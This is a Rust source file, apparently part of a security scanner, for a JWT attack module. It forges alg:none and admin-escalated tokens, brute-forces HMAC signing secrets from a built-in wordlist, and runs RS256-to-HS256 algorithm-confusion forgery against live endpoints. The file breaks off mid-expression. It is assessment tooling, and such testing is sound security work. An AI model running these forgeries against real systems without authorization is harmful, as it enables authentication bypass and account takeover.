//! JWT Attack Engine — world-class JSON Web Token security assessment.
//!
//! Goes far beyond a single `alg:none` probe. It performs **live, evidence-based** JWT testing:
//!
//!   * **Multi-source token harvesting** — Authorization / custom token headers, `Set-Cookie`, and
//!     response bodies (JSON token fields + embedded JWT regex), plus an operator-supplied token.
//!   * **Deep token analysis** — algorithm class, `exp`/`nbf`/`iat` presence, token lifetime,
//!     sensitive privilege claims, and the `kid` / `jku` / `x5u` injection surface.
//!   * **`alg:none` acceptance test** — forges unsigned tokens (`none`/`None`/`NONE`, empty sig) and
//!     measures a real differential against protected endpoints.
//!   * **RS256→HS256 algorithm-confusion** (the crown jewel) — pulls the server's RSA public key from
//!     its JWKS, re-signs a token with HMAC-SHA256 keyed on that public key, and tests acceptance.
//!   * **Weak-secret cracking** — offline HMAC brute-force of harvested HS* tokens against a curated +
//!     operator-supplied wordlist; a hit proves full token forgeability.
//!   * **JWKS hardening review** — weak RSA moduli (<2048-bit) and accidental private-key material.
//!
//! Every knob (which sources to harvest, which attacks to run, the HMAC wordlist, claim policy,
//! endpoints, JWKS URL, key thresholds, timeouts, intensity) is read from the live scan request
//! `job_params` via [`ArsenalConfig`], so the whole engine is driven from the graphical interface.
//! No finding is fabricated: an attack finding is only emitted when a real differential or signature
//! match is observed.

use crate::arsenal_config::{finding_rich, ArsenalConfig, Evidence, Intensity};
use crate::cloud_hunter::{GraphEdge, GraphNode};
use crate::engine_dispatch::EngineRunContext;
use crate::engine_probes::{
    empty_ok, extract_host, http_client, http_get, http_get_with_headers, normalize_url,
};
use crate::engine_result::{print_result, EngineResult};

#[path = "jwt_attack_supreme.rs"]
mod supreme;
use openssl::hash::MessageDigest;
use reqwest::Client;
use serde_json::{json, Value};

const ENGINE_ID: &str = "jwt_attack";
const MITRE: &str = "T1550.001";

/// Curated list of the most common JWT signing secrets seen in the wild.
const COMMON_HMAC_SECRETS: &[&str] = &[
    "secret",
    "secret123",
    "secretkey",
    "your-256-bit-secret",
    "your-384-bit-secret",
    "your-512-bit-secret",
    "changeme",
    "password",
    "password123",
    "admin",
    "administrator",
    "jwt",
    "jwt_secret",
    "jwtsecret",
    "jwt-secret",
    "jwtSecret",
    "supersecret",
    "super_secret",
    "topsecret",
    "mysecret",
    "mysecretkey",
    "key",
    "private",
    "privatekey",
    "private_key",
    "test",
    "testing",
    "dev",
    "development",
    "prod",
    "production",
    "default",
    "defaultsecret",
    "qwerty",
    "123456",
    "1234567890",
    "12345678",
    "0000",
    "root",
    "token",
    "access",
    "refresh",
    "auth",
    "authentication",
    "signature",
    "sign",
    "hmac",
    "shared",
    "sharedsecret",
    "secretpassword",
    "s3cr3t",
    "S3cr3t!",
    "secret_key_123",
    "very-secret",
    "ChangeMe123!",
    "iloveyou",
    "letmein",
    "welcome",
    "master",
    "masterkey",
    "api",
    "apikey",
    "api_secret",
    "client_secret",
    "oauth",
    "oauth_secret",
    "node",
    "nodejs",
    "express",
    "django-insecure",
    "spring",
    "laravel",
    "symfony",
    "flask",
    "secret0",
    "secret1",
    "abc123",
    "p@ssw0rd",
    "Password1",
    "HS256",
];

// ── Base64URL ──────────────────────────────────────────────────────────────────

fn b64_std_decode(s: &str) -> Option<Vec<u8>> {
    let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut lookup = [255u8; 256];
    for (i, &c) in alphabet.iter().enumerate() {
        lookup[c as usize] = i as u8;
    }
    let bytes: Vec<u8> = s.bytes().filter(|&b| b != b'=').collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i + 3 < bytes.len() {
        let a = lookup[bytes[i] as usize];
        let b = lookup[bytes[i + 1] as usize];
        let c = lookup[bytes[i + 2] as usize];
        let d = lookup[bytes[i + 3] as usize];
        if a == 255 || b == 255 || c == 255 || d == 255 {
            return None;
        }
        out.push((a << 2) | (b >> 4));
        out.push((b << 4) | (c >> 2));
        out.push((c << 6) | d);
        i += 4;
    }
    match bytes.len() - i {
        2 => {
            let a = lookup[bytes[i] as usize];
            let b = lookup[bytes[i + 1] as usize];
            if a == 255 || b == 255 {
                return None;
            }
            out.push((a << 2) | (b >> 4));
        }
        3 => {
            let a = lookup[bytes[i] as usize];
            let b = lookup[bytes[i + 1] as usize];
            let c = lookup[bytes[i + 2] as usize];
            if a == 255 || b == 255 || c == 255 {
                return None;
            }
            out.push((a << 2) | (b >> 4));
            out.push((b << 4) | (c >> 2));
        }
        _ => {}
    }
    Some(out)
}

fn b64url_to_std(s: &str) -> String {
    let padded = match s.len() % 4 {
        2 => format!("{}==", s),
        3 => format!("{}=", s),
        _ => s.to_string(),
    };
    padded.replace('-', "+").replace('_', "/")
}

fn b64url_decode_bytes(s: &str) -> Option<Vec<u8>> {
    b64_std_decode(&b64url_to_std(s))
}

fn b64url_decode_str(s: &str) -> Option<String> {
    b64url_decode_bytes(s).and_then(|b| String::from_utf8(b).ok())
}

fn b64url_encode(data: &[u8]) -> String {
    const ALPHA: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let mut out = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk[0];
        let b1 = *chunk.get(1).unwrap_or(&0);
        let b2 = *chunk.get(2).unwrap_or(&0);
        out.push(ALPHA[(b0 >> 2) as usize] as char);
        out.push(ALPHA[(((b0 & 0x03) << 4) | (b1 >> 4)) as usize] as char);
        if chunk.len() > 1 {
            out.push(ALPHA[(((b1 & 0x0f) << 2) | (b2 >> 6)) as usize] as char);
        }
        if chunk.len() > 2 {
            out.push(ALPHA[(b2 & 0x3f) as usize] as char);
        }
    }
    out
}

// ── HMAC (openssl) ──────────────────────────────────────────────────────────────

fn hmac_sign(secret: &[u8], data: &[u8], md: MessageDigest) -> Option<Vec<u8>> {
    let key = openssl::pkey::PKey::hmac(secret).ok()?;
    let mut signer = openssl::sign::Signer::new(md, &key).ok()?;
    signer.update(data).ok()?;
    signer.sign_to_vec().ok()
}

fn md_for_hs_alg(alg: &str) -> Option<MessageDigest> {
    match alg.to_ascii_uppercase().as_str() {
        "HS256" => Some(MessageDigest::sha256()),
        "HS384" => Some(MessageDigest::sha384()),
        "HS512" => Some(MessageDigest::sha512()),
        _ => None,
    }
}

/// Build a PEM-encoded RSA public key from JWK `n`/`e` parameters; returns `(pem, modulus_bits)`.
fn jwk_rsa_to_pem(n_b64: &str, e_b64: &str) -> Option<(Vec<u8>, u32)> {
    let n = b64url_decode_bytes(n_b64)?;
    let e = b64url_decode_bytes(e_b64)?;
    if n.is_empty() || e.is_empty() {
        return None;
    }
    let bn_n = openssl::bn::BigNum::from_slice(&n).ok()?;
    let bn_e = openssl::bn::BigNum::from_slice(&e).ok()?;
    let bits = bn_n.num_bits() as u32;
    let rsa = openssl::rsa::Rsa::from_public_components(bn_n, bn_e).ok()?;
    let pkey = openssl::pkey::PKey::from_rsa(rsa).ok()?;
    let pem = pkey.public_key_to_pem().ok()?;
    Some((pem, bits))
}

// ── Token model ─────────────────────────────────────────────────────────────────

fn looks_like_jwt(value: &str) -> bool {
    let parts: Vec<&str> = value.splitn(4, '.').collect();
    if parts.len() != 3 {
        return false;
    }
    // header + payload must be non-empty base64url; signature may be empty (alg=none).
    parts[0].len() >= 2
        && parts[1].len() >= 2
        && parts[..2].iter().all(|p| {
            p.chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '=')
        })
        && b64url_decode_str(parts[0]).is_some_and(|h| h.contains("alg"))
}

#[derive(Clone, Debug)]
struct ParsedJwt {
    raw: String,
    header: Value,
    payload: Value,
    signature_b64: String,
    signing_input: String,
    alg: String,
}

fn parse_jwt(token: &str) -> Option<ParsedJwt> {
    let t = token.trim().trim_start_matches("Bearer ").trim();
    let parts: Vec<&str> = t.splitn(3, '.').collect();
    if parts.len() != 3 {
        return None;
    }
    let header: Value = serde_json::from_str(&b64url_decode_str(parts[0])?).ok()?;
    let payload: Value = serde_json::from_str(&b64url_decode_str(parts[1])?).ok()?;
    let alg = header
        .get("alg")
        .and_then(Value::as_str)
        .unwrap_or("")
        .to_string();
    Some(ParsedJwt {
        raw: t.to_string(),
        header,
        payload,
        signature_b64: parts[2].to_string(),
        signing_input: format!("{}.{}", parts[0], parts[1]),
        alg,
    })
}

/// Forge a token. `secret = None` → `alg:none` (empty signature). `Some(secret)` → HMAC-SHA256.
fn forge_token(header: &Value, payload: &Value, secret: Option<&[u8]>) -> String {
    let h = b64url_encode(serde_json::to_string(header).unwrap_or_default().as_bytes());
    let p = b64url_encode(
        serde_json::to_string(payload)
            .unwrap_or_default()
            .as_bytes(),
    );
    let signing_input = format!("{}.{}", h, p);
    match secret {
        None => format!("{}.", signing_input),
        Some(key) => {
            let sig = hmac_sign(key, signing_input.as_bytes(), MessageDigest::sha256())
                .unwrap_or_default();
            format!("{}.{}", signing_input, b64url_encode(&sig))
        }
    }
}

/// Escalate a base payload with common privilege claims (used to forge an admin token).
fn escalate_payload(base: &Value) -> Value {
    let mut obj = base.as_object().cloned().unwrap_or_default();
    if obj.is_empty() {
        obj.insert("sub".into(), json!("admin"));
    }
    obj.insert("role".into(), json!("admin"));
    obj.insert("roles".into(), json!(["admin"]));
    obj.insert("admin".into(), json!(true));
    obj.insert("is_admin".into(), json!(true));
    obj.insert("isAdmin".into(), json!(true));
    // Refresh exp far into the future so the forged token isn't trivially expired.
    obj.insert("exp".into(), json!(4_102_444_800u64)); // 2100-01-01
    Value::Object(obj)
}

// ── Token harvesting ─────────────────────────────────────────────────────────────

fn extract_jwts_from_text(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    // Tokenize on characters that cannot appear inside a JWT.
    for tok in text.split(|c: char| {
        !(c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_' || c == '=')
    }) {
        if tok.len() >= 20 && looks_like_jwt(tok) {
            out.push(tok.to_string());
        }
    }
    out
}

fn harvest_from_headers(headers: &[(String, String)]) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for (name, value) in headers {
        let hname = name.to_ascii_lowercase();
        let interesting = hname.contains("authorization")
            || hname.contains("token")
            || hname.contains("cookie")
            || hname.contains("jwt")
            || hname.contains("x-auth");
        if !interesting {
            continue;
        }
        for jwt in extract_jwts_from_text(value) {
            out.push((format!("header:{}", name), jwt));
        }
    }
    out
}

fn harvest_from_body(body: &str) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for jwt in extract_jwts_from_text(body) {
        out.push(("body".to_string(), jwt));
    }
    out
}

// ── Findings: deep token analysis ────────────────────────────────────────────────

fn analyze_token(
    src: &str,
    parsed: &ParsedJwt,
    target: &str,
    cfg: &ArsenalConfig,
    findings: &mut Vec<Value>,
) {
    let alg_up = parsed.alg.to_ascii_uppercase();
    let token_prefix = parsed.raw.chars().take(42).collect::<String>();
    let header_obj = parsed.header.clone();
    let kid = parsed.header.get("kid").and_then(Value::as_str);
    let jku = parsed.header.get("jku").and_then(Value::as_str);
    let x5u = parsed.header.get("x5u").and_then(Value::as_str);

    // alg=none in a live token.
    if alg_up == "NONE" || parsed.alg.is_empty() {
        findings.push(finding_rich(
            ENGINE_ID,
            "JWT uses alg=none (unsigned token in use)",
            "critical",
            MITRE,
            &format!(
                "A live JWT from {} declares alg='{}' — the token is unsigned. Anyone can mint arbitrary claims (including admin) and the server cannot tell. Reject 'none' and pin an asymmetric/HMAC algorithm.",
                src, parsed.alg
            ),
            target,
            0.97,
            Evidence::new()
                .with("source", src)
                .with("alg", parsed.alg.clone())
                .with("token_prefix", token_prefix.clone())
                .with("header", header_obj.clone())
                .check("signed", false, parsed.alg.clone()),
        ));
    }

    // kid injection surface.
    if let Some(k) = kid {
        let suspicious = k.contains('/')
            || k.contains("..")
            || k.contains('\'')
            || k.contains('|')
            || k.contains('\\');
        findings.push(finding_rich(
            ENGINE_ID,
            "JWT 'kid' header present — injection surface",
            if suspicious { "high" } else { "low" },
            "T1550.001",
            &format!(
                "Token from {} carries a 'kid' header ('{}'). If the server uses 'kid' to load a key from a file path, DB row, or URL it may be vulnerable to path traversal / SQLi / SSRF key-substitution. Treat 'kid' as untrusted and look it up against an allow-list.",
                src, k
            ),
            target,
            if suspicious { 0.8 } else { 0.55 },
            Evidence::new()
                .with("source", src)
                .with("kid", k.to_string())
                .check("kid_looks_injectable", suspicious, k.to_string()),
        ));
    }

    // jku / x5u SSRF + key-substitution surface.
    for (field, val) in [("jku", jku), ("x5u", x5u)] {
        if let Some(u) = val {
            findings.push(finding_rich(
                ENGINE_ID,
                &format!("JWT '{}' header points to a remote key URL", field),
                "high",
                "T1550.001",
                &format!(
                    "Token from {} sets '{}'='{}'. If the verifier fetches keys from this URL without a strict host allow-list, an attacker can host their own key and achieve full token forgery (and blind SSRF). Pin the trusted key endpoint.",
                    src, field, u
                ),
                target,
                0.82,
                Evidence::new()
                    .with("source", src)
                    .with(field, u.to_string())
                    .with("oast_hint", cfg.string_or("oast_host", "(set oast_host to test SSRF)"))
                    .check("remote_key_url", true, u.to_string()),
            ));
        }
    }

    // Claim policy: exp / lifetime / sensitive privilege claims.
    if cfg.bool_or("analyze_claims", true) {
        let payload = &parsed.payload;
        let has_exp = payload.get("exp").is_some();
        let require_exp = cfg.bool_or("require_exp", true);
        if !has_exp && require_exp {
            findings.push(finding_rich(
                ENGINE_ID,
                "JWT has no expiry (exp) claim",
                "medium",
                "T1550.001",
                &format!("Token from {} omits 'exp'. Stolen tokens stay valid forever. Add a short 'exp' and rotate signing keys.", src),
                target,
                0.85,
                Evidence::new().with("source", src).check("has_exp", false, ""),
            ));
        }
        if let (Some(exp), Some(iat)) = (
            payload.get("exp").and_then(Value::as_i64),
            payload.get("iat").and_then(Value::as_i64),
        ) {
            let lifetime_min = (exp - iat).max(0) / 60;
            let max_min = cfg.u64_or("max_token_lifetime_minutes", 1440) as i64;
            if lifetime_min > max_min {
                findings.push(finding_rich(
                    ENGINE_ID,
                    &format!("Excessive JWT lifetime ({} min)", lifetime_min),
                    "medium",
                    "T1550.001",
                    &format!("Token from {} is valid for {} minutes (policy max {}). Long-lived bearer tokens widen the theft window.", src, lifetime_min, max_min),
                    target,
                    0.8,
                    Evidence::new().with("source", src).with("lifetime_minutes", lifetime_min).with("policy_max_minutes", max_min),
                ));
            }
        }
        let sensitive = cfg.string_list_or(
            "sensitive_claims",
            &[
                "role",
                "roles",
                "admin",
                "is_admin",
                "isAdmin",
                "scope",
                "scopes",
                "groups",
                "permissions",
                "authorities",
            ],
        );
        let present: Vec<String> = sensitive
            .iter()
            .filter(|k| payload.get(k.as_str()).is_some())
            .cloned()
            .collect();
        if !present.is_empty() {
            findings.push(finding_rich(
                ENGINE_ID,
                "JWT carries authorization claims (forgery = privilege escalation)",
                "info",
                "T1550.001",
                &format!(
                    "Token from {} embeds privilege claims {:?}. If signing is ever weak (alg confusion, weak HMAC, 'kid'/'jku' abuse), these become a direct privilege-escalation lever. Enforce server-side authorization, not just the token.",
                    src, present
                ),
                target,
                0.7,
                Evidence::new().with("source", src).with("authz_claims", json!(present)).with("payload", payload.clone()),
            ));
        }
    }

    // Weak / quantum-vulnerable algorithm note (only HS family is brute-forceable here).
    if md_for_hs_alg(&alg_up).is_some() {
        findings.push(finding_rich(
            ENGINE_ID,
            &format!("Symmetric JWT signing in use ({})", alg_up),
            "low",
            "T1550.001",
            &format!(
                "Token from {} is signed with the symmetric {} (shared secret). Every service that can verify can also forge. Prefer asymmetric RS256/ES256/EdDSA, and ensure the HMAC secret is ≥256 bits of entropy.",
                src, alg_up
            ),
            target,
            0.6,
            Evidence::new().with("source", src).with("alg", alg_up.clone()),
        ));
    }
}

/// Offline brute-force of an HS* token signature against the wordlist. Returns the secret if found.
fn crack_hmac_secret(parsed: &ParsedJwt, wordlist: &[String]) -> Option<String> {
    let md = md_for_hs_alg(&parsed.alg)?;
    let expected = b64url_decode_bytes(&parsed.signature_b64)?;
    if expected.is_empty() {
        return None;
    }
    for secret in wordlist {
        if let Some(sig) = hmac_sign(secret.as_bytes(), parsed.signing_input.as_bytes(), md) {
            if sig == expected {
                return Some(secret.clone());
            }
        }
    }
    None
}

// ── Live endpoint attacks ─────────────────────────────────────────────────────────

/// Send a baseline (no-auth) and a forged-bearer request; return `Some((baseline_status,
/// forged_status))` when the forged token is *accepted where the baseline was rejected*.
async fn differential_accept(
    client: &Client,
    url: &str,
    forged: &str,
) -> Option<(u16, u16, usize, usize)> {
    let baseline = http_get(client, url).await?;
    let forged_resp = http_get_with_headers(
        client,
        url,
        &[("Authorization", &format!("Bearer {}", forged))],
    )
    .await?;
    let baseline_protected = baseline.status == 401 || baseline.status == 403;
    let forged_ok = forged_resp.status >= 200 && forged_resp.status < 300;
    let bigger = forged_resp.body.len() > baseline.body.len().saturating_add(24);
    if forged_ok && (baseline_protected || bigger) {
        Some((
            baseline.status,
            forged_resp.status,
            baseline.body.len(),
            forged_resp.body.len(),
        ))
    } else {
        None
    }
}

// ── Engine entry points ──────────────────────────────────────────────────────────

pub async fn run_jwt_attack_result(target: &str) -> EngineResult {
    run_jwt_attack_result_ctx(target, &EngineRunContext::default()).await
}

pub async fn run_jwt_attack_result_ctx(target: &str, ctx: &EngineRunContext) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }
    let cfg = ArsenalConfig::from_ctx(ctx);
    let client = http_client().await;
    let base = normalize_url(target);
    let host = extract_host(target);
    let intensity = cfg.intensity();

    let do_harvest = cfg.bool_or("harvest", true);
    let test_alg_none = cfg.bool_or("test_alg_none", true);
    let test_confusion = cfg.bool_or("test_alg_confusion", true);
    let test_weak_hmac = cfg.bool_or("test_weak_hmac", true);
    let check_jwks = cfg.bool_or("check_jwks", true);

    let harvest_paths = cfg.string_list_or(
        "harvest_paths",
        &[
            "/",
            "/login",
            "/api/login",
            "/api/auth/login",
            "/auth",
            "/api/me",
            "/dashboard",
        ],
    );
    let auth_endpoints = cfg.string_list_or(
        "auth_endpoints",
        &[
            "/api/me",
            "/api/user",
            "/api/profile",
            "/profile",
            "/v1/me",
            "/api/v1/me",
            "/api/account",
            "/api/admin",
            "/admin",
        ],
    );
    let jwks_paths = cfg.string_list_or(
        "jwks_paths",
        &[
            "/.well-known/jwks.json",
            "/.well-known/openid-configuration",
            "/oauth/jwks",
            "/api/jwks",
            "/jwks.json",
        ],
    );
    let min_rsa_bits = cfg.u64_or("min_rsa_bits", 2048) as u32;

    let mut findings: Vec<Value> = Vec::new();
    let mut tokens: Vec<(String, ParsedJwt)> = Vec::new();
    let mut any_observed = false;

    // 0. Operator-supplied token (the most reliable, fully-analyzable input).
    if let Some(sample) = cfg.string("sample_jwt") {
        if let Some(p) = parse_jwt(&sample) {
            any_observed = true;
            tokens.push(("operator_supplied".to_string(), p));
        }
    }

    // 0b. Cross-protocol tokens harvested by WebSocket Intelligence Bus (same job).
    if let Some(arr) = ctx
        .job_params
        .get("intelligence_artifacts")
        .and_then(|v| v.as_array())
    {
        for art in arr {
            let proof = art.get("proof").and_then(|v| v.as_str()).unwrap_or("");
            let value = art.get("value").and_then(|v| v.as_str()).unwrap_or("");
            if value.is_empty() {
                continue;
            }
            let probe = crate::ws_intelligence_bus::IntelArtifact {
                kind: art
                    .get("kind")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string(),
                value: value.to_string(),
                source_url: String::new(),
                source_engine: String::new(),
                proof: proof.to_string(),
                captured_unix_ms: 0,
            };
            if !crate::ws_intelligence_bus::is_cross_protocol_eligible(&probe) {
                continue;
            }
            let raw = value.trim_start_matches("Bearer ").trim();
            if raw.starts_with("eyJ") {
                if let Some(p) = parse_jwt(raw) {
                    if tokens.iter().any(|(_, t)| t.raw == p.raw) {
                        continue;
                    }
                    any_observed = true;
                    tokens.push(("intelligence_bus_ws".to_string(), p));
                }
            }
        }
    }

    // 1. Harvest tokens from live responses.
    if do_harvest {
        let harvest_limit = match intensity {
            Intensity::Light => 3,
            Intensity::Aggressive => harvest_paths.len(),
            Intensity::Normal => harvest_paths.len().min(7),
        };
        for path in harvest_paths.iter().take(harvest_limit) {
            let url = join(&base, path);
            if let Some(p) = http_get(&client, &url).await {
                any_observed = true;
                let mut hits = harvest_from_headers(&p.headers);
                hits.extend(harvest_from_body(&p.body));
                for (src, jwt) in hits {
                    if tokens.iter().any(|(_, t)| t.raw == jwt) {
                        continue;
                    }
                    if let Some(parsed) = parse_jwt(&jwt) {
                        tokens.push((format!("{} ({})", src, url), parsed));
                    }
                }
            }
        }
    }

    // 2. Deep analysis of every observed token.
    for (src, parsed) in &tokens {
        analyze_token(src, parsed, target, &cfg, &mut findings);
    }

    // 3. Weak-HMAC offline crack of harvested HS* tokens.
    if test_weak_hmac {
        let mut wordlist: Vec<String> = COMMON_HMAC_SECRETS.iter().map(|s| s.to_string()).collect();
        wordlist.extend(cfg.string_list("hmac_wordlist"));
        wordlist.dedup();
        for (src, parsed) in &tokens {
            if md_for_hs_alg(&parsed.alg).is_none() {
                continue;
            }
            if let Some(secret) = crack_hmac_secret(parsed, &wordlist) {
                findings.push(finding_rich(
                    ENGINE_ID,
                    "JWT HMAC secret cracked — full token forgery",
                    "critical",
                    MITRE,
                    &format!(
                        "The {} signing secret for a {} token from {} was recovered from a common-secret wordlist: '{}'. An attacker can mint arbitrary tokens (any user, any role). Rotate to a long random secret immediately and migrate to asymmetric signing.",
                        parsed.alg, parsed.alg, src, secret
                    ),
                    target,
                    1.0,
                    Evidence::new()
                        .with("source", src.clone())
                        .with("alg", parsed.alg.clone())
                        .with("recovered_secret", secret.clone())
                        .with("wordlist_size", wordlist.len())
                        .check("secret_recovered", true, secret),
                ));
            }
        }
    }

    // 4. alg=none acceptance test against protected endpoints.
    if test_alg_none {
        let base_payload = tokens
            .first()
            .map(|(_, p)| p.payload.clone())
            .unwrap_or_else(|| json!({ "sub": "admin", "user": "admin" }));
        let payload = escalate_payload(&base_payload);
        let none_variants = ["none", "None", "NONE", "nOnE"];
        'none_outer: for path in &auth_endpoints {
            let url = join(&base, path);
            for alg in none_variants {
                let header = json!({ "alg": alg, "typ": "JWT" });
                let forged = forge_token(&header, &payload, None);
                if let Some((bs, fs, bl, fl)) = differential_accept(&client, &url, &forged).await {
                    any_observed = true;
                    findings.push(finding_rich(
                        ENGINE_ID,
                        "alg=none JWT accepted by protected endpoint (auth bypass)",
                        "critical",
                        MITRE,
                        &format!(
                            "Endpoint {} returned HTTP {} (body {}B) to a forged alg='{}' token, vs HTTP {} (body {}B) with no auth. The verifier accepts unsigned tokens — complete authentication bypass.",
                            url, fs, fl, alg, bs, bl
                        ),
                        target,
                        0.9,
                        Evidence::new()
                            .with("endpoint", url.clone())
                            .with("alg_variant", alg)
                            .with("baseline_status", bs)
                            .with("forged_status", fs)
                            .check("forged_accepted", true, fs),
                    ));
                    break 'none_outer;
                }
            }
        }
    }

    // 5. JWKS review + RS256→HS256 algorithm-confusion attack.
    if check_jwks || test_confusion {
        let mut rsa_pems: Vec<(Vec<u8>, u32)> = Vec::new();
        let explicit = cfg.string("jwks_url");
        let mut jwks_candidates: Vec<String> = explicit.into_iter().collect::<Vec<_>>();
        jwks_candidates.extend(jwks_paths.iter().map(|p| join(&base, p)));

        for url in jwks_candidates.iter().take(8) {
            let Some(p) = http_get(&client, url).await else {
                continue;
            };
            if p.status != 200 {
                continue;
            }
            let Ok(doc) = serde_json::from_str::<Value>(&p.body) else {
                continue;
            };
            // openid-configuration → follow jwks_uri.
            let keys_doc = if let Some(jwks_uri) = doc.get("jwks_uri").and_then(Value::as_str) {
                findings.push(finding_rich(
                    ENGINE_ID,
                    "OIDC discovery document exposed",
                    "info",
                    MITRE,
                    &format!("OpenID configuration at {} advertises jwks_uri={}. Confirms an OIDC IdP and its key endpoint.", p.final_url, jwks_uri),
                    target,
                    0.8,
                    Evidence::new().with("url", p.final_url.clone()).with("jwks_uri", jwks_uri.to_string()),
                ));
                http_get(&client, jwks_uri)
                    .await
                    .and_then(|r| serde_json::from_str::<Value>(&r.body).ok())
            } else {
                Some(doc)
            };
            let Some(keys_doc) = keys_doc else { continue };
            let Some(keys) = keys_doc.get("keys").and_then(Value::as_array) else {
                continue;
            };
            any_observed = true;
            findings.push(finding_rich(
                ENGINE_ID,
                &format!("JWKS exposed with {} key(s)", keys.len()),
                "info",
                MITRE,
                &format!("Signing key set reachable at {} ({} key(s)). Public exposure is normal for RS/ES, but it is exactly the material an RS256→HS256 confusion attack abuses.", p.final_url, keys.len()),
                target,
                0.8,
                Evidence::new().with("url", p.final_url.clone()).with("key_count", keys.len()),
            ));
            for key in keys {
                // Accidental private-key material.
                let priv_params: Vec<&str> = ["d", "p", "q", "dp", "dq", "qi"]
                    .into_iter()
                    .filter(|f| key.get(*f).is_some())
                    .collect();
                if !priv_params.is_empty() {
                    findings.push(finding_rich(
                        ENGINE_ID,
                        "PRIVATE key material exposed in JWKS",
                        "critical",
                        MITRE,
                        &format!("A key in {} contains private parameters {:?}. The signing private key is leaking — anyone can forge tokens. Rotate keys and publish only public components.", p.final_url, priv_params),
                        target,
                        1.0,
                        Evidence::new().with("url", p.final_url.clone()).with("private_params", json!(priv_params)).check("private_key_leaked", true, json!(priv_params)),
                    ));
                }
                if key.get("kty").and_then(Value::as_str) == Some("RSA") {
                    if let (Some(n), Some(e)) = (
                        key.get("n").and_then(Value::as_str),
                        key.get("e").and_then(Value::as_str),
                    ) {
                        if let Some((pem, bits)) = jwk_rsa_to_pem(n, e) {
                            if bits < min_rsa_bits {
                                findings.push(finding_rich(
                                    ENGINE_ID,
                                    &format!("Weak RSA signing key ({} bits)", bits),
                                    "high",
                                    MITRE,
                                    &format!("JWKS key at {} is RSA-{} (below {} minimum). Weak moduli reduce forgery cost. Rotate to ≥2048-bit (preferably 3072) or ES256/EdDSA.", p.final_url, bits, min_rsa_bits),
                                    target,
                                    0.85,
                                    Evidence::new().with("url", p.final_url.clone()).with("rsa_bits", bits),
                                ));
                            }
                            rsa_pems.push((pem, bits));
                        }
                    }
                }
            }
            if !rsa_pems.is_empty() {
                break;
            }
        }

        // RS256→HS256 confusion: re-sign with the public key as the HMAC secret.
        if test_confusion && !rsa_pems.is_empty() {
            let base_payload = tokens
                .iter()
                .find(|(_, p)| {
                    p.alg.to_ascii_uppercase().starts_with("RS")
                        || p.alg.to_ascii_uppercase().starts_with("ES")
                })
                .or_else(|| tokens.first())
                .map(|(_, p)| p.payload.clone())
                .unwrap_or_else(|| json!({ "sub": "admin", "user": "admin" }));
            let payload = escalate_payload(&base_payload);
            let header = json!({ "alg": "HS256", "typ": "JWT" });
            'conf_outer: for (pem, _bits) in &rsa_pems {
                // Try the PEM as-is and trimmed (servers differ on trailing newline).
                let pem_str = String::from_utf8_lossy(pem).to_string();
                let secret_variants: Vec<Vec<u8>> = vec![
                    pem.clone(),
                    pem_str.trim_end().as_bytes().to_vec(),
                    pem_str.trim().as_bytes().to_vec(),
                ];
                for secret in &secret_variants {
                    let forged = forge_token(&header, &payload, Some(secret));
                    for path in &auth_endpoints {
                        let url = join(&base, path);
                        if let Some((bs, fs, _bl, _fl)) =
                            differential_accept(&client, &url, &forged).await
                        {
                            findings.push(finding_rich(
                                ENGINE_ID,
                                "RS256→HS256 algorithm-confusion accepted (auth bypass)",
                                "critical",
                                MITRE,
                                &format!(
                                    "Endpoint {} accepted an HS256 token signed with the server's own RSA public key (baseline HTTP {} → forged HTTP {}). The verifier confuses the algorithm family and treats the public key as an HMAC secret — full authentication bypass and token forgery.",
                                    url, bs, fs
                                ),
                                target,
                                0.92,
                                Evidence::new()
                                    .with("endpoint", url.clone())
                                    .with("attack", "rs256_to_hs256_confusion")
                                    .with("baseline_status", bs)
                                    .with("forged_status", fs)
                                    .check("confusion_accepted", true, fs),
                            ));
                            break 'conf_outer;
                        }
                    }
                }
            }
        }
    }

    if !any_observed {
        return empty_ok(ENGINE_ID, target);
    }

    // 6. Summary.
    let crit = findings
        .iter()
        .filter(|f| f.get("severity").and_then(Value::as_str) == Some("critical"))
        .count();
    let high = findings
        .iter()
        .filter(|f| f.get("severity").and_then(Value::as_str) == Some("high"))
        .count();

    let sig = supreme::collect_signals(&findings, tokens.len());
    if cfg.bool_or("attack_paths", true) {
        supreme::extend_attack_paths(target, &sig, &mut findings);
    }
    supreme::emit_toxic_headline(target, &sig, &mut findings);
    supreme::emit_remediation_roadmap(target, &sig, &mut findings);
    if cfg.bool_or("emit_agent_guidance", true) {
        supreme::emit_agent_guidance(target, &mut findings);
    }
    let category_scores = supreme::finalize_category_scores(&sig);
    let (graph_nodes, graph_edges) = supreme::build_security_graph(target, &sig, &host);

    let summary_sev = if crit > 0 {
        "critical"
    } else if high > 0 {
        "high"
    } else if findings.is_empty() {
        "info"
    } else {
        "low"
    };
    findings.push(finding_rich(
        ENGINE_ID,
        &format!("JWT assessment summary for {} — {} token(s), {} critical", host, tokens.len(), crit),
        summary_sev,
        MITRE,
        &format!(
            "Analyzed {} JWT(s) on {}. Critical: {}, High: {}. {}",
            tokens.len(),
            host,
            crit,
            high,
            if crit > 0 { "Token forgery / auth bypass is possible — treat as P0." } else { "No forgery primitive proven; keep enforcing server-side authorization and short token lifetimes." }
        ),
        target,
        0.9,
        Evidence::new()
            .with("host", host.clone())
            .with("tokens_analyzed", tokens.len())
            .with("critical_findings", crit)
            .with("high_findings", high)
            .with("category_scores", category_scores.to_json())
            .with("intensity", intensity.as_str())
            .check("tokens_observed", !tokens.is_empty(), tokens.len()),
    ));

    let n = findings.len();
    let toxic = findings
        .iter()
        .filter(|f| f.get("category").and_then(Value::as_str) == Some("toxic_combination"))
        .count();
    EngineResult::ok_with_graph(
        findings,
        format!(
            "jwt_attack: {} finding(s) on {}{}{}",
            n,
            host,
            if toxic > 0 {
